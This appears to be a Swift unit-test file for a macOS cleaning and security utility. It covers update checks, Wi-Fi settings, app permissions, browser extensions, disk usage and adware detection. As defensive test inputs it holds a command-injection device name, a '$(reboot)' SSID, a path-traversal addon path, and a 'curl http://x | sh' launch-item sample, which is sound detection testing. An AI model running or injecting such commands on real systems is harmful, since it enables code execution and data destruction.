import CoreGraphics
import Foundation
import XCTest
@testable import PureMac

final class MacSaiPortTests: XCTestCase {
    // MARK: Updates

    func testVersionComparisonIsNumeric() {
        XCTAssertTrue(SparkleUpdateChecker.isNewer("1.10.0", than: "1.9.9"))
        XCTAssertTrue(SparkleUpdateChecker.isNewer("2.0", than: "1.99.1"))
        XCTAssertTrue(SparkleUpdateChecker.isNewer("1.2.1", than: "1.2"))
        XCTAssertFalse(SparkleUpdateChecker.isNewer("1.2.0", than: "1.2"))
        XCTAssertFalse(SparkleUpdateChecker.isNewer("1.9", than: "1.10"))
        XCTAssertTrue(SparkleUpdateChecker.isNewer("3 (456)", than: "2.9"))
        XCTAssertFalse(SparkleUpdateChecker.isNewer("beta", than: "1.0"))
    }

    func testOnlyHTTPSURLsAreTrusted() {
        XCTAssertTrue(SparkleUpdateChecker.isSafeURL(URL(string: "https://example.com/appcast.xml")!))
        XCTAssertFalse(SparkleUpdateChecker.isSafeURL(URL(string: "http://example.com/appcast.xml")!))
        XCTAssertFalse(SparkleUpdateChecker.isSafeURL(URL(string: "file:///tmp/app.zip")!))
    }

    func testAppcastParserPicksHighestVersionAndIgnoresDeltas() {
        let xml = """
        <rss xmlns:sparkle="http://www.andymatuschak.org/xml-namespaces/sparkle">
          <channel>
            <item>
              <sparkle:shortVersionString>2.1.0</sparkle:shortVersionString>
              <enclosure url="https://example.com/App-2.1.0.zip" sparkle:version="210"/>
              <sparkle:deltas>
                <enclosure url="https://example.com/delta.zip" sparkle:shortVersionString="9.9.9"/>
              </sparkle:deltas>
            </item>
            <item>
              <enclosure url="https://example.com/App-2.10.0.zip" sparkle:shortVersionString="2.10.0" sparkle:version="2100"/>
            </item>
            <item>
              <enclosure url="https://example.com/App-1.0.zip" sparkle:shortVersionString="1.0"/>
            </item>
          </channel>
        </rss>
        """
        let latest = AppcastParser().parseLatestItem(from: Data(xml.utf8))
        XCTAssertEqual(latest.version, "2.10.0")
        XCTAssertEqual(latest.downloadURL?.absoluteString, "https://example.com/App-2.10.0.zip")
    }

    // MARK: Wi-Fi

    func testWiFiDevicesComeFromWiFiPortsOnly() {
        let output = """
        Hardware Port: Ethernet
        Device: en0
        Ethernet Address: 1c:f6:4c:3f:72:8c

        Hardware Port: Wi-Fi
        Device: en1
        Ethernet Address: 1c:f6:4c:39:31:74

        Hardware Port: Thunderbolt Bridge
        Device: bridge0
        """
        XCTAssertEqual(SavedWiFiNetworks.wifiDevices(fromHardwarePorts: output), ["en1"])
    }

    func testPreferredNetworkListKeepsSpacesAndDropsDuplicates() {
        let output = "Preferred networks on en1:\n\tHome\n\tCafé Free Wi-Fi\n\t Leading space\n\tHome\n"
        XCTAssertEqual(SavedWiFiNetworks.ssids(fromPreferredList: output), ["Home", "Café Free Wi-Fi", " Leading space"])
    }

    func testDeviceNamesAreValidated() {
        XCTAssertTrue(SavedWiFiNetworks.isValidDevice("en1"))
        XCTAssertFalse(SavedWiFiNetworks.isValidDevice("1en"))
        XCTAssertFalse(SavedWiFiNetworks.isValidDevice("en1; rm"))
        XCTAssertFalse(SavedWiFiNetworks.isValidDevice(""))
    }

    func testShellQuotingNeutralisesSSIDs() {
        let line = SavedWiFiNetworks.commandLine("/usr/sbin/networksetup", ["-removepreferredwirelessnetwork", "en1", "Bob's $(reboot)"])
        XCTAssertEqual(line, "'/usr/sbin/networksetup' '-removepreferredwirelessnetwork' 'en1' 'Bob'\\''s $(reboot)'")
    }

    func testOsascriptErrorsAreCleanedUp() {
        XCTAssertEqual(SavedWiFiNetworks.humanReadableError("0:120: execution error: Network not found. (1)"), "Network not found.")
        XCTAssertEqual(SavedWiFiNetworks.humanReadableError("Plain message"), "Plain message")
        XCTAssertEqual(SavedWiFiNetworks.currentSSID(fromAirportNetwork: "Current Wi-Fi Network: Home\n"), "Home")
        XCTAssertNil(SavedWiFiNetworks.currentSSID(fromAirportNetwork: "You are not associated with an AirPort network."))
    }

    // MARK: Permissions

    func testOnlyAllowedAndLimitedGrantsAreKept() {
        let rows = [
            AppPermissionsReader.Row(service: "kTCCServiceCamera", client: "com.example.cam", clientType: 0, authValue: 2, indirectObject: nil),
            AppPermissionsReader.Row(service: "kTCCServiceMicrophone", client: "com.example.cam", clientType: 0, authValue: 0, indirectObject: nil),
            AppPermissionsReader.Row(service: "kTCCServiceScreenCapture", client: "/usr/local/bin/tool", clientType: 1, authValue: 3, indirectObject: nil),
            AppPermissionsReader.Row(service: "kTCCServiceAppleEvents", client: "com.example.script", clientType: 0, authValue: 2, indirectObject: "com.apple.finder"),
            AppPermissionsReader.Row(service: "kTCCServiceAppleEvents", client: "com.example.script", clientType: 0, authValue: 2, indirectObject: "UNUSED"),
            AppPermissionsReader.Row(service: "kTCCServiceUnknown", client: "com.example.other", clientType: 0, authValue: 2, indirectObject: nil),
        ]
        let grants = AppPermissionsReader.grants(from: rows)
        XCTAssertEqual(grants.count, 4)
        XCTAssertFalse(grants.contains { $0.permission == .microphone })
        XCTAssertTrue(grants.contains { $0.permission == .screenRecording && $0.isLimited && $0.clientIsPath })
        XCTAssertEqual(grants.filter { $0.permission == .automation }.compactMap(\.target), ["com.apple.finder"])
    }

    func testAppsWithPowerfulPermissionsComeFirst() {
        let grants = [
            PermissionGrant(permission: .camera, client: "com.example.a", clientIsPath: false, isLimited: false, target: nil),
            PermissionGrant(permission: .fullDiskAccess, client: "com.example.z", clientIsPath: false, isLimited: false, target: nil),
            PermissionGrant(permission: .microphone, client: "com.example.a", clientIsPath: false, isLimited: false, target: nil),
        ]
        let apps = AppPermissionsReader.apps(from: grants)
        XCTAssertEqual(apps.map(\.client), ["com.example.z", "com.example.a"])
        XCTAssertEqual(apps.last?.permissions, [.camera, .microphone])
    }

    // MARK: Browser extensions

    func testChromiumIDsAndVersionFolders() {
        XCTAssertTrue(BrowserExtensionsScanner.isValidChromiumID(String(repeating: "a", count: 32)))
        XCTAssertFalse(BrowserExtensionsScanner.isValidChromiumID(String(repeating: "z", count: 32)))
        XCTAssertFalse(BrowserExtensionsScanner.isValidChromiumID("abc"))
        XCTAssertEqual(BrowserExtensionsScanner.newestVersionFolder(["1.9.0_0", "1.10.0_0", "1.2_1"]), "1.10.0_0")
    }

    func testChromiumOriginComesFromPolicyAndLocation() {
        let id = String(repeating: "b", count: 32)
        XCTAssertEqual(BrowserExtensionsScanner.chromiumOrigin(id: id, location: 1, forced: [id]), .policy)
        XCTAssertEqual(BrowserExtensionsScanner.chromiumOrigin(id: id, location: 9, forced: []), .policy)
        XCTAssertEqual(BrowserExtensionsScanner.chromiumOrigin(id: id, location: 10, forced: []), .component)
        XCTAssertEqual(BrowserExtensionsScanner.chromiumOrigin(id: id, location: 1, forced: []), .user)
        XCTAssertEqual(BrowserExtensionsScanner.chromiumOrigin(id: id, location: nil, forced: []), .user)
    }

    func testOnlyExtensionFoldersMayBeTrashed() {
        let id = String(repeating: "c", count: 32)
        func record(_ browser: BrowserKind, path: String, identifier: String = id, profile: String = "Default") -> BrowserExtensionRecord {
            BrowserExtensionRecord(browser: browser, profile: profile, identifier: identifier, name: "X", updatedAt: nil, path: path, origin: .user, isSuspicious: false)
        }
        let base = "/Users/me/Library/Application Support/Google/Chrome"
        XCTAssertTrue(BrowserExtensionsScanner.isSafeDeletionPath(record(.chrome, path: "\(base)/Default/Extensions/\(id)")))
        XCTAssertFalse(BrowserExtensionsScanner.isSafeDeletionPath(record(.chrome, path: "\(base)/Default/Extensions")))
        XCTAssertFalse(BrowserExtensionsScanner.isSafeDeletionPath(record(.chrome, path: "\(base)/Default/Extensions/\(id)/../..")))
        XCTAssertFalse(BrowserExtensionsScanner.isSafeDeletionPath(record(.chrome, path: "\(base)/Other/Extensions/\(id)")))
        XCTAssertTrue(BrowserExtensionsScanner.isSafeDeletionPath(record(.firefox, path: "/p/abcd.default/extensions/addon@x.xpi", identifier: "addon@x", profile: "abcd.default")))
        XCTAssertFalse(BrowserExtensionsScanner.isSafeDeletionPath(record(.safari, path: "/Applications/A.app/Contents/PlugIns/E.appex", profile: "")))
    }

    func testFirefoxListsOnlyUserProfileAddons() throws {
        let profile = URL(fileURLWithPath: "/tmp/ff/abcd.default-release")
        let json = """
        {"addons": [
          {"id": "good@x", "type": "extension", "location": "app-profile", "path": "/tmp/ff/abcd.default-release/extensions/good@x.xpi", "defaultLocale": {"name": "Good"}, "updateDate": 1700000000000},
          {"id": "system@x", "type": "extension", "location": "app-system-defaults", "path": "/Applications/Firefox.app/x.xpi"},
          {"id": "theme@x", "type": "theme", "location": "app-profile", "path": "/tmp/ff/abcd.default-release/extensions/theme@x.xpi"},
          {"id": "escape@x", "type": "extension", "location": "app-profile", "path": "/tmp/ff/abcd.default-release/extensions/../../evil"}
        ]}
        """
        let records = BrowserExtensionsScanner.firefoxRecords(json: Data(json.utf8), profile: profile)
        XCTAssertEqual(records.map(\.identifier), ["good@x"])
        XCTAssertEqual(records.first?.name, "Good")
        XCTAssertEqual(records.first?.profile, "abcd.default-release")
    }

    func testAdwareNamesAreFlagged() {
        XCTAssertTrue(BrowserExtensionsScanner.isSuspicious(name: "SearchBaron Helper"))
        XCTAssertFalse(BrowserExtensionsScanner.isSuspicious(name: "uBlock Origin"))
    }

    // MARK: Space Lens

    func testTreemapFillsTheRectProportionally() {
        let bounds = CGRect(x: 0, y: 0, width: 600, height: 400)
        let values: [Double] = [500, 250, 150, 60, 40]
        let frames = SquarifiedTreemap.layout(values, in: bounds)
        XCTAssertEqual(frames.count, values.count)
        let total = values.reduce(0, +)
        for (value, frame) in zip(values, frames) {
            XCTAssertEqual(Double(frame.width * frame.height), value / total * 240_000, accuracy: 1)
            XCTAssertTrue(bounds.insetBy(dx: -0.5, dy: -0.5).contains(frame))
        }
        XCTAssertEqual(SquarifiedTreemap.layout([], in: bounds).count, 0)
        XCTAssertEqual(SquarifiedTreemap.layout([0, 0], in: bounds), [.zero, .zero])
    }

    func testScanAggregatesSizesAndFoldsSmallFiles() async throws {
        let root = FileManager.default.temporaryDirectory.appendingPathComponent("SpaceLensTests-\(UUID().uuidString)")
        let many = root.appendingPathComponent("many")
        try FileManager.default.createDirectory(at: many, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: root) }
        try Data(count: 2_000_000).write(to: root.appendingPathComponent("big.mov"))
        for index in 0..<12 {
            try Data(count: 10_000).write(to: many.appendingPathComponent("f\(index).txt"))
        }

        let result = await SpaceLensScanner.scan(root: root) { _ in }
        let tree = try XCTUnwrap(result?.root)
        XCTAssertEqual(tree.children.first?.name, "big.mov")
        XCTAssertEqual(tree.children.first?.category, .video)
        let folder = try XCTUnwrap(tree.children.first { $0.name == "many" })
        XCTAssertEqual(folder.children.count, 1)
        XCTAssertEqual(folder.children.first?.kind, .smallerFiles)
        XCTAssertEqual(folder.itemCount, 12)
        XCTAssertEqual(tree.size, tree.children.reduce(0) { $0 + $1.size })
        XCTAssertEqual(tree.itemCount, 13)
    }

    func testSpaceLensOnlyTrashesUserAndExternalItems() {
        let home = FileManager.default.homeDirectoryForCurrentUser
        XCTAssertTrue(SpaceLensScanner.canMoveToTrash(home.appendingPathComponent("Downloads/movie.mov")))
        XCTAssertTrue(SpaceLensScanner.canMoveToTrash(home.appendingPathComponent("Library/Caches/com.example")))
        XCTAssertFalse(SpaceLensScanner.canMoveToTrash(home.appendingPathComponent("Downloads")))
        XCTAssertFalse(SpaceLensScanner.canMoveToTrash(home.appendingPathComponent("Library/Caches")))
        XCTAssertFalse(SpaceLensScanner.canMoveToTrash(home))
        XCTAssertFalse(SpaceLensScanner.canMoveToTrash(URL(fileURLWithPath: "/System/Library")))
        XCTAssertFalse(SpaceLensScanner.canMoveToTrash(URL(fileURLWithPath: "/Applications/Safari.app")))
        XCTAssertTrue(SpaceLensScanner.canMoveToTrash(URL(fileURLWithPath: "/Volumes/Backup/old.dmg")))
        XCTAssertFalse(SpaceLensScanner.canMoveToTrash(URL(fileURLWithPath: "/Volumes/Backup")))
    }

    // MARK: Unused apps

    func testUnusedAppsDefaultToSixMonths() {
        let defaults = UserDefaults.standard
        let previous = defaults.object(forKey: UnusedAppsFinder.monthsKey)
        defer { defaults.set(previous, forKey: UnusedAppsFinder.monthsKey) }
        defaults.removeObject(forKey: UnusedAppsFinder.monthsKey)
        XCTAssertEqual(UnusedAppsFinder.configuredMonths, 6)
        defaults.set(5, forKey: UnusedAppsFinder.monthsKey)
        XCTAssertEqual(UnusedAppsFinder.configuredMonths, 6)
        defaults.set(3, forKey: UnusedAppsFinder.monthsKey)
        XCTAssertEqual(UnusedAppsFinder.configuredMonths, 3)
        defaults.set(12, forKey: UnusedAppsFinder.monthsKey)
        XCTAssertEqual(UnusedAppsFinder.configuredMonths, 12)
    }

    // MARK: Threat Check

    func testKnownAdwareNamesMatchCaseInsensitively() {
        XCTAssertTrue(ThreatSignatures.nameMatchesKnownPattern("com.pirrit.agent.plist"))
        XCTAssertTrue(ThreatSignatures.nameMatchesKnownPattern("MacKeeper Helper.app"))
        XCTAssertTrue(ThreatSignatures.nameMatchesKnownPattern("OperatorMac.sh"))
        XCTAssertFalse(ThreatSignatures.nameMatchesKnownPattern("com.google.keystone.agent.plist"))
    }

    func testLaunchItemHeuristicsReadProgramArguments() {
        XCTAssertTrue(ThreatSignatures.launchItemLooksSuspicious(plist: ["ProgramArguments": ["/bin/sh", "-c", "curl http://x | sh"]]))
        XCTAssertTrue(ThreatSignatures.launchItemLooksSuspicious(plist: ["Program": "/tmp/.payload"]))
        XCTAssertFalse(ThreatSignatures.launchItemLooksSuspicious(plist: ["ProgramArguments": ["/Applications/Foo.app/Contents/MacOS/foo"]]))
        XCTAssertFalse(ThreatSignatures.launchItemLooksSuspicious(plist: ["Label": "com.example.empty"]))
    }

    func testThreatReasonSeparatesFamiliesFromHeuristicsAndHonorsIgnoredPrefixes() throws {
        let folder = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)
        try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: folder) }

        func write(_ name: String, _ plist: [String: Any]) throws -> URL {
            let url = folder.appendingPathComponent(name)
            try PropertyListSerialization.data(fromPropertyList: plist, format: .xml, options: 0).write(to: url)
            return url
        }

        let family = try write("com.example.agent.plist", ["Label": "com.adload.updater", "ProgramArguments": ["/usr/bin/true"]])
        let dropper = try write("com.example.dropper.plist", ["Label": "com.example.dropper", "ProgramArguments": ["/bin/sh", "-c", "echo aGk= | base64 -d"]])
        let own = try write("com.mactidy.scheduler.plist", ["Label": "com.mactidy.scheduler", "ProgramArguments": ["/usr/bin/osascript"]])
        let clean = try write("com.example.clean.plist", ["Label": "com.example.clean", "ProgramArguments": ["/usr/bin/true"]])

        XCTAssertEqual(ThreatSignatures.reason(for: family), .knownFamily)
        XCTAssertEqual(ThreatSignatures.reason(for: dropper), .suspiciousLaunchItem)
        XCTAssertNil(ThreatSignatures.reason(for: own, ignoringLabelPrefixes: ["com.mactidy"]))
        XCTAssertNil(ThreatSignatures.reason(for: clean))
    }
}
